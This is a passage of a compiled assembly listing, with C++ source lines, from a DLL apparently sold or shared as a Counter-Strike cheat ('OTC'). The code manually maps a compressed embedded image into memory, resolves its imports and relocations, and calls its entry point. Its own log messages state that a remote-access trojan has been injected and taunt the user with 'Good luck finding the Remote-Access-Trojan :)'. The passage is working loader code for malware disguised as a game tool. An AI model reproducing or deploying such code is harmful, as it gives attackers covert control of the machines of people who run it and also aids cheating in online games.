; 126  :         std::memcpy (reinterpret_cast <DWORD*> (base + offsetToInstructions + instructionsIterator), compressedArray + segmentedCharIterator, instructionCharMoveCount);

  00450	8b 01		 mov	 eax, DWORD PTR [ecx]

; 127  :         segmentedCharIterator += arrayCharCycleUpdate;

  00452	8d 49 04	 lea	 ecx, DWORD PTR [ecx+4]
  00455	89 02		 mov	 DWORD PTR [edx], eax
  00457	8d 52 07	 lea	 edx, DWORD PTR [edx+7]
  0045a	83 ee 01	 sub	 esi, 1
  0045d	75 f1		 jne	 SHORT $LL183@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  0045f	a1 00 00 00 00	 mov	 eax, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
  00464	85 c0		 test	 eax, eax
  00466	0f 84 05 02 00
	00		 je	 $LN265@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 128  :        std::memmove (reinterpret_cast<DWORD*> (Segment::GetSafeAllocationPointer() + 0x1), player, 0x20);                                                        //

  0046c	6a 20		 push	 32			; 00000020H
  0046e	40		 inc	 eax
  0046f	68 00 00 00 00	 push	 OFFSET ??_C@_06CPAKJCCD@Neonik@
  00474	50		 push	 eax
  00475	e8 00 00 00 00	 call	 _memmove
  0047a	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 97   :         segment.GetFramework().UpdateWatermark (getenv ("USERNAME"), "Neonik");

  0047d	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  00481	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T24[ebp]
  00487	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 98   :         segment.GetFramework().UpdateMenuWatermark ("Neonik.tk");

  0048c	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T28[ebp]
  00492	50		 push	 eax
  00493	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  00496	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 146  :        std::strncpy (watermark, value, 12);                                                                                                                      //

  0049b	6a 0c		 push	 12			; 0000000cH
  0049d	8d 45 e4	 lea	 eax, DWORD PTR _watermark$43[ebp]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 98   :         segment.GetFramework().UpdateMenuWatermark ("Neonik.tk");

  004a0	c6 45 fc 08	 mov	 BYTE PTR __$EHRec$[ebp+8], 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 146  :        std::strncpy (watermark, value, 12);                                                                                                                      //

  004a4	68 00 00 00 00	 push	 OFFSET ??_C@_09MLFFDPN@Neonik?4tk@
  004a9	50		 push	 eax
  004aa	ff d7		 call	 edi
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  004ac	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 146  :        std::strncpy (watermark, value, 12);                                                                                                                      //

  004b2	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  004b5	85 d2		 test	 edx, edx
  004b7	0f 84 c3 01 00
	00		 je	 $LN296@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h

; 25   : 		return UnsafeAllocatedPointer;

  004bd	8d 4d e4	 lea	 ecx, DWORD PTR _watermark$43[ebp]
  004c0	81 c2 5f 02 0e
	00		 add	 edx, 918111		; 000e025fH
  004c6	be 03 00 00 00	 mov	 esi, 3
  004cb	0f 1f 44 00 00	 npad	 5
$LL203@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp

; 126  :         std::memcpy (reinterpret_cast <DWORD*> (base + offsetToInstructions + instructionsIterator), compressedArray + segmentedCharIterator, instructionCharMoveCount);

  004d0	8b 01		 mov	 eax, DWORD PTR [ecx]

; 127  :         segmentedCharIterator += arrayCharCycleUpdate;

  004d2	8d 49 04	 lea	 ecx, DWORD PTR [ecx+4]
  004d5	89 02		 mov	 DWORD PTR [edx], eax
  004d7	8d 52 07	 lea	 edx, DWORD PTR [edx+7]
  004da	83 ee 01	 sub	 esi, 1
  004dd	75 f1		 jne	 SHORT $LL203@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 98   :         segment.GetFramework().UpdateMenuWatermark ("Neonik.tk");

  004df	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T28[ebp]
  004e5	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  004e9	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 100  :         logger.Info ("| [~] Updating STUB...");

  004ee	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  004f1	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@MPGHJPCI@?$HM?5?$FL?$HO?$FN?5Updating?5STUB?4?4?4@
  004f6	50		 push	 eax
  004f7	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  004fc	a1 00 00 00 00	 mov	 eax, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 100  :         logger.Info ("| [~] Updating STUB...");

  00501	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00504	85 c0		 test	 eax, eax
  00506	0f 84 83 01 00
	00		 je	 $LN297@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp

; 81   :     SegmentHeader::DLLMAIN_CALLBACK DllMain = reinterpret_cast <SegmentHeader::DLLMAIN_CALLBACK> (Segment::GetSafeAllocationPointer() + SegmentHeader::Datacase::OEP);

  0050c	8d 88 8c 73 04
	00		 lea	 ecx, DWORD PTR [eax+291724]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00512	85 c9		 test	 ecx, ecx
  00514	0f 84 84 01 00
	00		 je	 $LN298@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp

; 85   :     DllMain (reinterpret_cast<HMODULE> (Segment::GetSafeAllocationPointer()), DLL_PROCESS_ATTACH, NULL);

  0051a	56		 push	 esi
  0051b	6a 01		 push	 1
  0051d	50		 push	 eax
  0051e	ff d1		 call	 ecx
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 106  :         segment.GetFramework().SetMenuStatus (false);

  00520	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T32[ebp]
  00526	50		 push	 eax
  00527	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  0052a	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
  0052f	c6 45 fc 09	 mov	 BYTE PTR __$EHRec$[ebp+8], 9
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00533	a1 00 00 00 00	 mov	 eax, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
  00538	85 c0		 test	 eax, eax
  0053a	0f 84 6a 01 00
	00		 je	 $LN299@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 106  :         segment.GetFramework().SetMenuStatus (false);

  00540	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T32[ebp]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 159  :     *reinterpret_cast<DWORD*> (Segment::GetSafeAllocationPointer() + Datacase::MENU_STATUS_RVA) = status;

  00546	89 b0 67 5f 48
	00		 mov	 DWORD PTR [eax+4743015], esi
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 106  :         segment.GetFramework().SetMenuStatus (false);

  0054c	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  00550	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 108  :         logger.Info ("| [+] Remote-Access-Trojan Injected.");

  00555	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00558	68 00 00 00 00	 push	 OFFSET ??_C@_0CF@IPOJIKMB@?$HM?5?$FL?$CL?$FN?5Remote?9Access?9Trojan?5Inje@
  0055d	50		 push	 eax
  0055e	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  00563	8b 45 dc	 mov	 eax, DWORD PTR _logger$41[ebp+20]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 108  :         logger.Info ("| [+] Remote-Access-Trojan Injected.");

  00566	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  00569	2b c6		 sub	 eax, esi
  0056b	74 23		 je	 SHORT $LN235@DllMain
  0056d	83 e8 01	 sub	 eax, 1
  00570	75 29		 jne	 SHORT $LN240@DllMain

; 21   : 		  break;
; 22   : 
; 23   : 		case FILE:
; 24   : 			GLoggerFile << "\n" << std::endl;

  00572	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_01EEMJAFIK@?6@
  00577	b9 00 00 00 00	 mov	 ecx, OFFSET ?GLoggerFile@@3V?$basic_ofstream@DU?$char_traits@D@std@@@std@@A ; GLoggerFile
  0057c	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00581	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00586	8b c8		 mov	 ecx, eax
  00588	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
  0058e	eb 0b		 jmp	 SHORT $LN240@DllMain
$LN235@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp

; 4    : 	for (int lineIterator = 0; lineIterator < newLineCount; lineIterator++) m_PrintInterface ("\n");

  00590	68 00 00 00 00	 push	 OFFSET ??_C@_01EEMJAFIK@?6@
  00595	ff 55 c8	 call	 DWORD PTR _logger$41[ebp]
  00598	83 c4 04	 add	 esp, 4
$LN240@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 113  :         logger.Info ("Good luck finding the Remote-Access-Trojan :)");

  0059b	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  0059e	68 00 00 00 00	 push	 OFFSET ??_C@_0CO@JECMMAFB@Good?5luck?5finding?5the?5Remote?9Ac@
  005a3	50		 push	 eax
  005a4	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  005a9	8b 45 dc	 mov	 eax, DWORD PTR _logger$41[ebp+20]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 113  :         logger.Info ("Good luck finding the Remote-Access-Trojan :)");

  005ac	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  005af	83 e8 00	 sub	 eax, 0
  005b2	74 23		 je	 SHORT $LN246@DllMain
  005b4	83 e8 01	 sub	 eax, 1
  005b7	75 36		 jne	 SHORT $LN251@DllMain

; 21   : 		  break;
; 22   : 
; 23   : 		case FILE:
; 24   : 			GLoggerFile << "\n" << std::endl;

  005b9	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_01EEMJAFIK@?6@
  005be	b9 00 00 00 00	 mov	 ecx, OFFSET ?GLoggerFile@@3V?$basic_ofstream@DU?$char_traits@D@std@@@std@@A ; GLoggerFile
  005c3	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  005c8	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  005cd	8b c8		 mov	 ecx, eax
  005cf	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
  005d5	eb 18		 jmp	 SHORT $LN251@DllMain
$LN246@DllMain:

; 18   : 
; 19   : 	    case CONSOLE:
; 20   : 		   m_Game.PrintNewLineToConsole (count);

  005d7	8b 7d c8	 mov	 edi, DWORD PTR _logger$41[ebp]
  005da	be 02 00 00 00	 mov	 esi, 2
  005df	90		 npad	 1
$LL252@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp

; 4    : 	for (int lineIterator = 0; lineIterator < newLineCount; lineIterator++) m_PrintInterface ("\n");

  005e0	68 00 00 00 00	 push	 OFFSET ??_C@_01EEMJAFIK@?6@
  005e5	ff d7		 call	 edi
  005e7	83 c4 04	 add	 esp, 4
  005ea	83 ee 01	 sub	 esi, 1
  005ed	75 f1		 jne	 SHORT $LL252@DllMain
$LN251@DllMain:
  005ef	8d 4d a4	 lea	 ecx, DWORD PTR _segment$40[ebp+20]
  005f2	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ
  005f7	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  005fa	e8 00 00 00 00	 call	 ??1SegmentHeader@@QAE@XZ
$LN255@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 119  :     return TRUE;

  005ff	b8 01 00 00 00	 mov	 eax, 1
$LN1@DllMain:

; 120  : }

  00604	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  00607	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  0060e	59		 pop	 ecx
  0060f	5f		 pop	 edi
  00610	5e		 pop	 esi
  00611	8b 4d f0	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00614	33 cd		 xor	 ecx, ebp
  00616	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0061b	8b e5		 mov	 esp, ebp
  0061d	5d		 pop	 ebp
  0061e	c2 0c 00	 ret	 12			; 0000000cH
$LN4@DllMain:

; 52   :            logger.Info ("| [-] I cannot run OTC on the current version of Windows.");
; 53   :            logger.Info ("| [~] Please upgrade to 7 or 8, or 10. (PC build)");

  00621	be 00 00 00 00	 mov	 esi, OFFSET ??_C@_0DC@NHDBKKLG@?$HM?5?$FL?$HO?$FN?5Please?5upgrade?5to?57?5or?58?0@
  00626	b8 00 00 00 00	 mov	 eax, OFFSET ??_C@_0DK@OACAPHFB@?$HM?5?$FL?9?$FN?5I?5cannot?5run?5OTC?5on?5the?5c@
$LN14@DllMain:

; 61   :             logger.Info ("| [-] Could not find the msvc redist package installed on your system.");
; 62   :             logger.Info ("| [~] You can download and install the redist build from here: https://www.microsoft.com/en-us/download/confirmation.aspx?id=52685.");
; 63   :             return FALSE;

  0062b	50		 push	 eax
  0062c	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  0062f	50		 push	 eax
  00630	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  00635	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00638	56		 push	 esi
  00639	50		 push	 eax
  0063a	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  0063f	83 c4 10	 add	 esp, 16			; 00000010H
  00642	8d 4d a4	 lea	 ecx, DWORD PTR _segment$40[ebp+20]
  00645	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ
  0064a	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  0064d	e8 00 00 00 00	 call	 ??1SegmentHeader@@QAE@XZ
  00652	33 c0		 xor	 eax, eax
  00654	eb ae		 jmp	 SHORT $LN1@DllMain
$LN81@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 8    :         PanicUtils::Release (Layers::ROUTINE, reason);

  00656	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BL@CHOBNDMJ@Variable?5or?5value?5is?5null?4@
  0065b	b9 01 00 00 00	 mov	 ecx, 1
  00660	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN295@DllMain:

; 14   :         PanicUtils::Release (layer, reason);

  00665	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0CB@OJCABHLM@Allocated?5memory?5pointer?5is?5nul@
  0066a	33 c9		 xor	 ecx, ecx
  0066c	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN265@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 120  : }

  00671	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BM@FGCKGLBN@Allocation?5pointer?5is?5null?4@
  00676	b9 01 00 00 00	 mov	 ecx, 1
  0067b	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN296@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 14   :         PanicUtils::Release (layer, reason);

  00680	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BM@FGCKGLBN@Allocation?5pointer?5is?5null?4@
  00685	b9 01 00 00 00	 mov	 ecx, 1
  0068a	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN297@DllMain:
  0068f	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BM@FGCKGLBN@Allocation?5pointer?5is?5null?4@
  00694	b9 01 00 00 00	 mov	 ecx, 1
  00699	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN298@DllMain:
  0069e	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BC@MFGAJMC@OEP?5value?5is?5null@
  006a3	33 c9		 xor	 ecx, ecx
  006a5	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN299@DllMain:
  006aa	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_0BM@FGCKGLBN@Allocation?5pointer?5is?5null?4@
  006af	b9 01 00 00 00	 mov	 ecx, 1
  006b4	e8 00 00 00 00	 call	 ?Release@PanicUtils@@SAXW4Layers@1@PBD@Z ; PanicUtils::Release
$LN293@DllMain:
  006b9	cc		 int	 3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$_DllMain@12$9:
  00000	8b 8d 70 fe ff
	ff		 mov	 ecx, DWORD PTR _this$[ebp]
  00006	e9 00 00 00 00	 jmp	 ??1?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ
__unwindfunclet$_DllMain@12$10:
  0000b	8b 8d 70 fe ff
	ff		 mov	 ecx, DWORD PTR _this$[ebp]
  00011	83 c1 08	 add	 ecx, 8
  00014	e9 00 00 00 00	 jmp	 ??1?$vector@KV?$allocator@K@std@@@std@@QAE@XZ ; std::vector<unsigned long,std::allocator<unsigned long> >::~vector<unsigned long,std::allocator<unsigned long> >
__unwindfunclet$_DllMain@12$7:
  00019	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  0001c	e9 00 00 00 00	 jmp	 ??1SegmentHeader@@QAE@XZ
__unwindfunclet$_DllMain@12$0:
  00021	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  00024	e9 00 00 00 00	 jmp	 ??1Segment@@QAE@XZ
__unwindfunclet$_DllMain@12$1:
  00029	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T18[ebp]
  0002f	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
__unwindfunclet$_DllMain@12$2:
  00034	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T19[ebp]
  0003a	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
__unwindfunclet$_DllMain@12$3:
  0003f	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T22[ebp]
  00045	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
__unwindfunclet$_DllMain@12$4:
  0004a	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T24[ebp]
  00050	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
__unwindfunclet$_DllMain@12$5:
  00055	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T28[ebp]
  0005b	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
__unwindfunclet$_DllMain@12$6:
  00060	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T32[ebp]
  00066	e9 00 00 00 00	 jmp	 ??1SegmentFramework@@QAE@XZ
  0006b	cc		 int	 3
  0006c	cc		 int	 3
  0006d	cc		 int	 3
  0006e	cc		 int	 3
  0006f	cc		 int	 3
__ehhandler$_DllMain@12:
  00070	90		 npad	 1
  00071	90		 npad	 1
  00072	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00076	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00079	8b 8a 48 fe ff
	ff		 mov	 ecx, DWORD PTR [edx-440]
  0007f	33 c8		 xor	 ecx, eax
  00081	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00086	8b 4a fc	 mov	 ecx, DWORD PTR [edx-4]
  00089	33 c8		 xor	 ecx, eax
  0008b	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00090	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$_DllMain@12
  00095	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
_DllMain@12 ENDP
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
;	COMDAT ??0Segment@@QAE@XZ
_TEXT	SEGMENT
_this$ = -20						; size = 4
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
??0Segment@@QAE@XZ PROC					; Segment::Segment, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??0Segment@@QAE@XZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00014	56		 push	 esi
  00015	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001a	33 c5		 xor	 eax, ebp
  0001c	50		 push	 eax
  0001d	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00020	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00026	8b f1		 mov	 esi, ecx
  00028	89 75 f0	 mov	 DWORD PTR _this$[ebp], esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0002b	6a 20		 push	 32			; 00000020H
  0002d	89 75 ec	 mov	 DWORD PTR _this$[ebp], esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00030	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
  00036	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0003d	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  00042	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  00045	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  00047	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  0004a	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  0004d	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  00053	89 06		 mov	 DWORD PTR [esi], eax
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 50   :     SegmentHeader () {

  00055	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  0005c	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
  00063	c7 46 0c 00 00
	00 00		 mov	 DWORD PTR [esi+12], 0
  0006a	c7 46 10 00 00
	00 00		 mov	 DWORD PTR [esi+16], 0
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 51   :         FillImports ();

  00071	8b ce		 mov	 ecx, esi
  00073	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1
  00077	e8 00 00 00 00	 call	 ?FillImports@SegmentHeader@@AAEXXZ ; SegmentHeader::FillImports

; 52   :         FillRelocations ();

  0007c	8b ce		 mov	 ecx, esi
  0007e	e8 00 00 00 00	 call	 ?FillRelocations@SegmentHeader@@AAEXXZ ; SegmentHeader::FillRelocations
  00083	8d 4e 14	 lea	 ecx, DWORD PTR [esi+20]
  00086	c7 45 fc 02 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 2
  0008d	e8 00 00 00 00	 call	 ??0SegmentFramework@@QAE@XZ
  00092	8b c6		 mov	 eax, esi
  00094	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  00097	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  0009e	59		 pop	 ecx
  0009f	5e		 pop	 esi
